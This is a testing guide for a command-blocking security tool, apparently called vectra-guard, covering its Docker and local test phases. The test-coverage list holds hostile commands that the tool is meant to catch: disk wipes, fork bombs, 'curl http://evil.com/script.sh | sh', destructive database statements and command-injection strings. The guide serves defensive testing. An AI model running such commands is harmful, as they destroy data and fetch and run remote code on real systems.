# Extended Testing Guide

## Overview

The extended test suite provides comprehensive security testing that:
1. **First tests in Docker** (verifies execution blocking)
2. **Then tests locally** (verifies detection)

This two-phase approach ensures the tool works correctly before running on your local system.

## Two-Phase Testing

### Phase 1: Docker Testing (Execution Verification)

Tests that dangerous commands are actually blocked or sandboxed when executed.

```bash
# Run extended tests in Docker
make test-extended-docker

# Or manually
docker-compose -f docker-compose.test.yml run --rm --no-deps test-extended
```

**What it tests:**
- ✅ Execution blocking for critical commands
- ✅ Sandbox isolation for risky commands
- ✅ Actual command execution (in isolated containers)

**Safety:** All tests run in Docker containers - cannot affect your host system.

### Phase 2: Local Testing (Detection Verification)

Tests that dangerous commands are detected (safe - never executes).

```bash
# Run extended tests locally
make test-extended

# Or manually
./scripts/test-extended.sh --local
```

**What it tests:**
- ✅ Detection of attack patterns
- ✅ Risk level classification
- ✅ Code identification

**Safety:** Only uses `validate` - never executes commands.

## Recommended Workflow

### Step 1: Test in Docker First

```bash
make test-extended-docker
```

**Expected:** All attacks should be blocked or sandboxed.

**If tests pass:** Proceed to local testing.

**If tests fail:** Fix issues before local testing.

### Step 2: Test Locally (Once Docker Tests Pass)

```bash
make test-extended
```

**Expected:** All attacks should be detected.

### Step 3: Full Test (Both Phases)

```bash
make test-extended-full
```

This automatically:
1. Runs Docker tests first
2. Only proceeds to local tests if Docker tests pass
3. Provides clear feedback on each phase

## Test Coverage

### Attack Vectors Tested

1. **File System Attacks** (20+ variations)
   - `rm -r /*` (incident scenario)
   - `rm -rf /bin`, `/usr`, `/etc`, etc.
   - `dd if=/dev/zero of=/dev/sda`
   - `mkfs.ext4 /dev/sda`
   - `find / -type f -delete`

2. **Process Attacks** (10+ variations)
   - Fork bombs: `:(){ :|:& };:`
   - System shutdown: `halt`, `reboot`, `shutdown`
   - Kill commands: `killall -9 init`

3. **Network Attacks** (8+ variations)
   - `curl http://evil.com/script.sh | sh`
   - `wget http://evil.com/script.sh -O- | bash`
   - Reverse shells
   - Network-based command injection

4. **Privilege Escalation** (6+ variations)
   - `sudo rm -rf /`
   - `su - root`
   - `sudo bash`

5. **Database Attacks** (8+ variations)
   - `DROP DATABASE production`
   - `TRUNCATE TABLE users`
   - `DELETE FROM users`
   - `FLUSHALL`, `FLUSHDB`

6. **Git Attacks** (3+ variations)
   - `git push --force origin main`
   - `git filter-repo`
   - `git reflog expire`

7. **Command Injection** (10+ variations)
   - `ls; rm -rf /`
   - `$(rm -rf /)`
   - `\`rm -rf /\``
   - Language-based injection (Python, Perl, Ruby, Node)

8. **Bypass Attempts** (7+ variations)
   - `rm -rf / # bypass comment`
   - `bash -c 'rm -rf /'`
   - `/bin/rm -rf /`

9. **Safe Commands** (6+ variations)
   - `echo 'test'`
   - `ls -la`
   - `pwd`
   - Should NOT trigger detection

## Test Options

### Quick Mode

Run only critical tests:

```bash
# Docker
docker-compose -f docker-compose.test.yml run --rm --no-deps test-extended --quick

# Local
./scripts/test-extended.sh --local --quick
```

### Verbose Mode

Show detailed output:

```bash
# Docker
docker-compose -f docker-compose.test.yml run --rm --no-deps test-extended --verbose

# Local
./scripts/test-extended.sh --local --verbose
```

## Understanding Results

### ✅ Success (All Attacks Blocked)

```
╔═══════════════════════════════════════════════════════════╗
║                    Test Summary                            ║
╚═══════════════════════════════════════════════════════════╝
Attacks Blocked: 85
Attacks Escaped: 0
Tests Passed: 85
Tests Failed: 0

✓ All attacks blocked! Security system is working.
```

### ❌ Failure (Security Breach)

```
Attacks Escaped: 2
✗ SECURITY BREACH DETECTED! Some attacks escaped protection!
```

## Safety Guarantees

### Docker Testing
- ✅ Runs in isolated containers
- ✅ Cannot affect host system
- ✅ All dangerous commands sandboxed
- ✅ Tests actual execution blocking

### Local Testing
- ✅ Only uses `validate` (never executes)
- ✅ No system changes
- ✅ No file modifications
- ✅ Tests detection only

## Troubleshooting

### Docker Tests Fail

1. **Check Docker is running:**
   ```bash
   docker info
   ```

2. **Rebuild test image:**
   ```bash
   docker-compose -f docker-compose.test.yml build --no-cache
   ```

3. **Check sandbox config:**
   ```bash
   cat vectra-guard.yaml | grep -A 5 sandbox
   ```

### Local Tests Fail

1. **Check binary exists:**
   ```bash
   ./vectra-guard version
   ```

2. **Rebuild binary:**
   ```bash
   go build -o vectra-guard .
   ```

3. **Run with verbose:**
   ```bash
   ./scripts/test-extended.sh --local --verbose
   ```

## Quick Reference

```bash
# Full test (Docker then local)
make test-extended-full

# Docker only (execution tests)
make test-extended-docker

# Local only (detection tests)
make test-extended

# Quick mode
make test-extended-quick

# Verbose output
./scripts/test-extended.sh --local --verbose
```

## Best Practices

1. **Always test in Docker first** - Verifies execution blocking
2. **Then test locally** - Verifies detection
3. **Use full test** - Ensures both phases pass
4. **Check results carefully** - Any escaped attack is a security issue
5. **Fix issues before deployment** - Don't skip failing tests

---

**Remember:** Docker tests verify execution blocking, local tests verify detection. Both are important! 🛡️

